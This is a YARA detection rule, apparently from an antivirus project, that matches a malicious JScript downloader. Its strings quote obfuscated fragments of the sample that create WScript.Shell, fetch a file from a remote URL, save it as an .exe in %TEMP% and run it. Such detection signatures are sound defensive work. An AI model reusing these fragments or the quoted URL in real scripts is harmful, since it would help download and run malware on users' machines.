rule sig_20160401_f193bf04aa3373ce96c0110700398dce {
  meta:
    description = "datamaliciousorder - file 20160401_f193bf04aa3373ce96c0110700398dce.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1372dcb31f50dceded2cb97851bd658b8566b79f5a6f5b6e9266b02b83331fa7"

  strings:
    $s1  = "function IqEsq(YlWk, IaYy){SpdCmk = SpdCmk * 1; return YlWk - IaYy;};" fullword ascii
    $s2  = "var EupFgc = function CssFe() {return WScript[TnWdy](\"WScript\"+\".Shell\");}(), XjnAq = 11;" fullword ascii
    $s3  = "if (OpwVct[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "OpwVct[MkjDoe](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s5  = "function HrlQlr() {return EupFgc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sJdHq0cXnBOgc.ex\" + \"e\";};" fullword ascii
    $s6  = "function MriIl(){return RcUym + \"\";};" fullword ascii
    $s7  = "function PjEcz() {return ((EeXmo == true) && (EeXmo == SytLe)) ? 1 : SpdCmk;};" fullword ascii
    $s8  = "var UfOdc = false;" fullword ascii
    $s9  = "SytLe = true; " fullword ascii
    $s10 = "function RawBm(UrbYb){EupFgc[\"R\"+\"un\"](UrbYb, SpdCmk, SpdCmk);};" fullword ascii
    $s11 = "var EeXmo = false;" fullword ascii
    $s12 = "var ArXc = new this[\"Date\"]();" fullword ascii
    $s13 = "function WnVm(RyeFwg) {var SqYnm = (1, 2, 3, 4, 5, RyeFwg); return SqYnm;};" fullword ascii
    $s14 = "return IqEsq(DheJa, StMuh);" fullword ascii
    $s15 = "EeXmo = true; " fullword ascii
    $s16 = "function RspSdb(){return 23;};" fullword ascii
    $s17 = "function ZoXv(){return TnWdy;};" fullword ascii
    $s18 = "function IwAat()" fullword ascii
    $s19 = "}while (CdqBzo);" fullword ascii
    $s20 = "var SytLe = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}